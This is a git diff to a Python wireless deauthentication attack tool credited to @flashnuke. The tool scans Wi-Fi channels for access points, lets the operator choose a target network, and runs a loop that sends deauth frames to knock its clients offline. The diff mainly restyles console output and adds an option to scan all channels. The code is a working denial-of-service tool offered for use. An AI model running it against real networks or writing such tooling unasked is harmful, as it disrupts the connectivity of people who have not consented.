@@ -27,13 +27,12 @@ conf.verb = 0
 
 class Interceptor:
     _BROADCAST_MACADDR = "ff:ff:ff:ff:ff:ff"
-    _NON_OVERLAPPING_CHANNELS = {1, 6, 11,
-                                36, 40, 44, 48, 52, 56, 60, 64,
-                                100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144,
-                                149, 153, 157, 161, 165}
+    _NON_OVERLAPPING_CHANNELS = {1, 6, 11,  # 2.4GHz
+                                 36, 44, 52, 60, 100, 108, 116, 124, 132, 140, 149, 157}  # 5GHz
 
-    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager, *args, **kwargs):
+    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager, all_channels, *args, **kwargs):
         self.interface = net_iface
+        self._all_channels = all_channels
         self._channel_sniff_timeout = 2
         self._scan_intv = 0.1
         self._deauth_intv = 0.1
@@ -49,18 +48,18 @@ class Interceptor:
         self.target_ssid = dict()  # ssid stats
 
         if not skip_monitor_mode_setup:
-            printf("[*] Setting up monitor mode...")
+            print_info(f"Setting up monitor mode...")
             if not self._enable_monitor_mode():
-                printf("[!] Monitor mode was not enabled properly")
+                print_error(f"Monitor mode was not enabled properly")
                 raise Exception("Unable to turn on monitor mode")
-            printf("[*] Monitor mode was set up successfully")
+            print_info(f"Monitor mode was set up successfully")
         else:
-            printf("[*] Skipping monitor mode setup...")
+            print_info(f"Skipping monitor mode setup...")
 
         if kill_networkmanager:
-            printf("[*] Killing NetworkManager...")
+            print_info(f"Killing NetworkManager...")
             if not self._kill_networkmanager():
-                printf("[!] Failed to kill NetworkManager...")
+                print_error(f"Failed to kill NetworkManager...")
 
         self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
 
@@ -68,7 +67,7 @@ class Interceptor:
         for cmd in [f"sudo ip link set {self.interface} down",
                     f"sudo iw {self.interface} set monitor control",
                     f"sudo ip link set {self.interface} up"]:
-            printf(f"[>] Running command -> '{cmd}'")
+            print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
             if os.system(cmd):
                 return False
         return True
@@ -76,7 +75,7 @@ class Interceptor:
     @staticmethod
     def _kill_networkmanager():
         cmd = 'systemctl stop NetworkManager'
-        printf(f"[>] Running command -> '{cmd}'")
+        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
         return not os.system(cmd)
 
     def _set_channel(self, ch_num):
@@ -87,7 +86,7 @@ class Interceptor:
         all_channels = [int(channel.split('Channel')[1].split(':')[0].strip())
                         for channel in os.popen(f'iwlist {self.interface} channel').readlines()
                         if 'Channel' in channel and 'Current' not in channel]
-        return [ch for ch in all_channels if ch in Interceptor._NON_OVERLAPPING_CHANNELS]
+        return [ch for ch in all_channels if ch in Interceptor._NON_OVERLAPPING_CHANNELS or self._all_channels]
 
     def _ap_sniff_cb(self, pkt):
         try:
@@ -106,24 +105,25 @@ class Interceptor:
 
     def _scan_channels_for_aps(self):
         try:
-            printf("\n")
             for idx, ch_num in enumerate(self._channel_range):
                 self._set_channel(ch_num)
-                clear_line(2)
-                printf(f"[*] Scanning channel {self._current_channel_num} ({idx + 1} out of {len(self._channel_range)})")
+                print_info(f"Scanning channel {self._current_channel_num} ({idx + 1}"
+                           f" out of {len(self._channel_range)})", end="\r")
                 sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=self._channel_sniff_timeout)
         except KeyboardInterrupt:
             return
+        finally:
+            printf("")
 
     def _start_initial_ap_scan(self) -> dict:
-        printf(f"[*] Starting AP scan, please wait... ({len(self._channel_range)} channels total)")
+        print_info(f"Starting AP scan, please wait... ({len(self._channel_range)} channels total)")
 
         self._scan_channels_for_aps()
 
         ctr = 0
         target_map = dict()
         printf(DELIM)
-        pref = ' ' * 6
+        pref = '[   ] '
         printf(f"{pref}{self._generate_ssid_str('SSID Name', 'Channel', 'MAC Address', len(pref))}")
 
         for channel, all_channel_aps in self._channel_range.items():
@@ -134,16 +134,17 @@ class Interceptor:
                 target_map[ctr] = copy.deepcopy(ssid_stats)
                 target_map[ctr]['ssid'] = ssid
                 pref = f"[{str(ctr).rjust(3, ' ')}] "
-                printf(f"{pref}{self._generate_ssid_str(ssid, ssid_stats['channel'], ssid_stats['mac_addr'], len(pref))}")
+                preflen = len(pref)
+                pref = f"[{BOLD}{PURPLE}{str(ctr).rjust(3, ' ')}{RESET}] "
+                printf(f"{pref}{self._generate_ssid_str(ssid, ssid_stats['channel'], ssid_stats['mac_addr'], preflen)}")
         if not target_map:
-            printf("[!] Not APs were found, quitting...")
+            print_error("Not APs were found, quitting...")
             self._abort = True
             exit(0)
 
         chosen = -1
         while chosen not in target_map.keys():
-            printf(f">>>>> Choose a target from {min(target_map.keys())} <---> {max(target_map.keys())}")
-            chosen = int(input())
+            chosen = int(print_input(f"Choose a target from {min(target_map.keys())} to {max(target_map.keys())}:"))
 
         return target_map[chosen]
 
@@ -168,12 +169,12 @@ class Interceptor:
                pkt.haslayer(Dot11QoS)
 
     def _listen_for_clients(self):
-        printf(f"[*] Setting up a listener for new clients...")
+        print_info(f"Setting up a listener for new clients...")
         sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: self._abort is True)
 
     def _run_deauther(self):
         try:
-            printf(f"[*] Starting de-auth loop...")
+            print_info(f"Starting de-auth loop...")
 
             ap_mac = self.target_ssid["mac_addr"]
 
@@ -196,14 +197,14 @@ class Interceptor:
                           iface=self.interface)
             sleep(self._deauth_intv)
         except Exception as exc:
-            printf(f"[!] Exception in deauth-loop -> {traceback.format_exc()}")
+            print_error(f"Exception in deauth-loop -> {traceback.format_exc()}")
             self._abort = True
             exit(0)
 
     def run(self):
         self.target_ssid = self._start_initial_ap_scan()
-        printf(f"[*] Attacking target {self.target_ssid['ssid']}")
-        printf(f"[*] Setting channel -> {self.target_ssid['channel']}")
+        print_info(f"Attacking target {self.target_ssid['ssid']}")
+        print_info(f"Setting channel -> {self.target_ssid['channel']}")
         self._set_channel(self.target_ssid['channel'])
 
         for action in [self._run_deauther, self._listen_for_clients]:
@@ -215,17 +216,17 @@ class Interceptor:
         try:
             start = self.get_time()
             while not self._abort:
-                printf(f"[*] Target SSID{self.target_ssid['ssid'].rjust(80 - 15, ' ')}")
-                printf(f"[*] Channel{str(self.target_ssid['channel']).rjust(80 - 11, ' ')}")
-                printf(f"[*] MAC addr{self.target_ssid['mac_addr'].rjust(80 - 12, ' ')}")
-                printf(f"[*] Net interface{self.interface.rjust(80 - 17, ' ')}")
-                printf(f"[*] Confirmed clients{str(len(self.target_ssid['clients'])).rjust(80 - 21, ' ')}")
-                printf(f"[*] Elapsed sec {str(self.get_time() - start).rjust(80 - 16, ' ')}")
+                print_info(f"Target SSID{self.target_ssid['ssid'].rjust(80 - 15, ' ')}")
+                print_info(f"Channel{str(self.target_ssid['channel']).rjust(80 - 11, ' ')}")
+                print_info(f"MAC addr{self.target_ssid['mac_addr'].rjust(80 - 12, ' ')}")
+                print_info(f"Net interface{self.interface.rjust(80 - 17, ' ')}")
+                print_info(f"Confirmed clients{BOLD}{str(len(self.target_ssid['clients'])).rjust(80 - 21, ' ')}{RESET}")
+                print_info(f"Elapsed sec {BOLD}{str(self.get_time() - start).rjust(80 - 16, ' ')}{RESET}")
                 sleep(self._printf_res_intv)
                 clear_line(7)
         except KeyboardInterrupt:
             printf(f"\n{DELIM}")
-            printf(f"[!] User asked to stop, quitting...")
+            print_error(f"User asked to stop, quitting...")
 
     @staticmethod
     def _init_ap_dict(mac_addr: str, ch: int) -> dict:
@@ -243,18 +244,18 @@ class Interceptor:
 if __name__ == "__main__":
     printf(f"\n{BANNER}\n"
            f"Make sure of the following:\n"
-           f"1. You are running as sudo\n"
-           f"2. You kill NetworkManager (manually or by passing --kill)\n"
-           f"3. Your wireless adapter supports monitor mode (refer to docs)\n\n"
-           f"Written by @flashnuke")
+           f"1. You are running as {BOLD}sudo{RESET}\n"
+           f"2. You kill NetworkManager (manually or by passing {BOLD}--kill{RESET})\n"
+           f"3. Your wireless adapter supports {BOLD}monitor mode{RESET} (refer to docs)\n\n"
+           f"Written by {BOLD}@flashnuke{RESET}")
     printf(DELIM)
+    restore_print()
 
     if "linux" not in platform:
         raise Exception(f"Unsupported operating system {platform}, only linux is supported...")
     with open("requirements.txt", "r") as reqs:
         pkg_resources.require(reqs.readlines())
 
-    # arguments = define_args()
     parser = argparse.ArgumentParser(description='A simple program to perform a deauth attack')
     parser.add_argument('-i', '--iface', help='a network interface with monitor mode enabled (i.e -> "eth0")',
                         action='store', dest="net_iface", metavar="network_interface", required=True)
@@ -262,10 +263,14 @@ if __name__ == "__main__":
                         default=False, dest="skip_monitormode", required=False)
     parser.add_argument('-k', '--kill', help='kill NetworkManager (might interfere with the process)',
                         action='store_true', default=False, dest="kill_networkmanager", required=False)
+    parser.add_argument('-a', '--all-channels', help="don't filter by overlapping channels (use only if you know what "
+                                                     "you're doing!)",
+                        action='store_true', default=False, dest="all_channels", required=False)
     pargs = parser.parse_args()
 
     invalidate_print()  # after arg parsing
     attacker = Interceptor(net_iface=pargs.net_iface,
                            skip_monitor_mode_setup=pargs.skip_monitormode,
-                           kill_networkmanager=pargs.kill_networkmanager)
+                           kill_networkmanager=pargs.kill_networkmanager,
+                           all_channels=pargs.all_channels)
     attacker.run()
